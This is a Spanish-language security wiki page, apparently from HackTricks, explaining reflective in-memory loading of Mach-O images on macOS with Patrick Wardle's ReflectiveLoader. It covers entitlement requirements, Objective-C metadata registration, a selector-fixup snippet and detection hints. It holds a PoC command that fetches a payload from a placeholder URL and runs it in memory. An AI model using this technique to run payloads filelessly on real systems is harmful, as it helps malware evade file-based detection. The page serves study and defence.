# Carga reflectiva de Mach-O en macOS

{{#include ../../../banners/hacktricks-training.md}}

Un loader reflectivo asigna una imagen Mach-O desde bytes que ya están en su propio proceso, luego la enlaza y ejecuta sus inicializadores sin pedirle al loader del sistema que abra un archivo de payload. Esto es **ejecución de código en el proceso**, no una primitiva de escalada de privilegios ni de inyección en procesos remotos.<sup>[[2]](#references)</sup>

En versiones recientes de macOS, la antigua ruta `NSCreateObjectFileImageFromMemory`/`NSLinkModule` escribe la imagen en el disco. ReflectiveLoader, en cambio, incorpora código antiguo de carga de dyld de Apple; Wardle lo demostró en macOS 15 y 26.<sup>[[2]](#references)[[3]](#references)</sup>

Si el loader usa Hardened Runtime, su código sin firmar en memoria necesita una excepción de memoria ejecutable, como `com.apple.security.cs.allow-unsigned-executable-memory` o `com.apple.security.cs.disable-executable-page-protection`; de lo contrario, la aplicación de la firma de código bloquea la ejecución. Esta es una restricción de firma del loader, no una primitiva de escalada. Consulta la [referencia de entitlements de macOS](../macos-security-protections/macos-dangerous-entitlements.md#comapplesecuritycsallow-unsigned-executable-memory).<sup>[[2]](#references)</sup>

Para la PoC, proporciona una URL que sirva un **bundle, framework o dylib** Mach-O sin procesar. Su `main.mm` rechaza las descargas vacías e indica que no se admiten los payloads que usan `LC_DYLD_CHAINED_FIXUPS`. También se acepta una ruta local, pero esa opción no es un flujo de trabajo sin archivos. La variante con URL lee los bytes en `NSData` y pasa su búfer y longitud a `custom_dlopen_from_memory`.<sup>[[4]](#references)</sup>

```bash
./PoC 'https://example.invalid/payload.dylib'
```

El loader integrado llama a `ImageLoaderMachO::instantiateFromMemory` y, después, a `image->link`. Registra los metadatos de Objective-C **después del linking, pero antes de** `image->runInitializers`, que ejecuta los constructores.<sup>[[5]](#references)</sup> Sin el registro, un constructor que envíe un mensaje de Objective-C puede fallar con `unrecognized selector sent to instance`.<sup>[[3]](#references)</sup> Consulta el [flujo normal de carga de imágenes de dyld](macos-library-injection/macos-dyld-process.md#flow) y la [referencia de las secciones Mach-O](../macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md#objective-c-common-sections).

## Activación de los metadatos de Objective-C

A diferencia de la carga normal de dyld, integrar el loader de imágenes antiguo no hace que los metadatos de Objective-C del payload estén disponibles automáticamente para `libobjc`.<sup>[[3]](#references)</sup> El enfoque adaptado de LLVM JIT recorre las secciones de Objective-C `__DATA` y `__DATA_CONST` mapeadas y, antes de ejecutar los constructores, sigue estos pasos:<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>

1. Recorre `__objc_selrefs` en pasos de `sizeof(SEL)`. Obtiene el nombre de cada selector no nulo con `sel_getName`, lo pasa a `sel_registerName` y reemplaza el puntero de la sección por el `SEL` canónico.
2. Recopila las clases de `__objc_classlist` y las registra con `objc_readClassPair`, resolviendo primero las dependencias de las superclases.
3. Reescribe las referencias de `__objc_classrefs` y `__objc_superrefs` para que apunten a las clases o metaclases registradas, y adjunta los métodos de las categorías desde `__objc_catlist`.

Por ejemplo, la reparación de selectores en `ObjCRuntime.cpp` equivale a:<sup>[[6]](#references)</sup>

```objectivec
for (uint8_t *cursor = sectionStart;
     cursor < sectionStart + selRefsSectionSize;
     cursor += sizeof(SEL)) {
    SEL *selector = (SEL *)cursor;
    if (*selector == NULL) continue;
    *selector = sel_registerName(sel_getName(*selector));
}
```

El PoC se basa en el comportamiento interno del runtime de Objective-C y no admite todas las funciones del formato Mach-O, por lo que su código de registro sirve como referencia de implementación, no como un loader genérico listo para usar.<sup>[[1]](#references)[[4]](#references)[[6]](#references)</sup> El registro es necesario tanto para las clases y los métodos de Apple a los que se hace referencia como para las clases definidas por el payload.<sup>[[3]](#references)</sup>

En las pruebas del autor, una imagen cargada de forma reflectiva no aparece en `dyld_all_image_infos`. En su lugar, sus mappings ejecutables anónimos pueden aparecer como regiones `dylib` sin nombre en `vmmap`; los frames muestreados pueden mostrarse como `<unknown binary>`. Estas son pistas para la inspección, no una atribución fiable a este loader, y el acceso a la información de tareas de otro proceso está limitado por los entitlements. Consulta [macOS memory dumping](../macos-files-folders-and-binaries/macos-memory-dumping.md) para conocer las restricciones de acceso a procesos.<sup>[[3]](#references)</sup>

## References

- [1] [LLVM JIT, Objective-C y Swift en macOS: recopilación de conocimientos](https://stanislaw.github.io/2018-09-03-llvm-jit-objc-and-swift-knowledge-dump.html)
- [2] [Restaurar la carga reflectiva de código en macOS (Parte I)](https://objective-see.org/blog/blog_0x7C.html)
- [3] [Restaurar la carga reflectiva de código en macOS (Parte II)](https://objective-see.org/blog/blog_0x82.html)
- [4] [PoC de ReflectiveLoader: main.mm](https://github.com/pwardle/ReflectiveLoader/blob/main/PoC/PoC/main.mm)
- [5] [ReflectiveLoader: custom_dlfcn.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/custom_dlfcn.cpp)
- [6] [ReflectiveLoader: ObjCRuntime.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/ObjCRuntime.cpp)
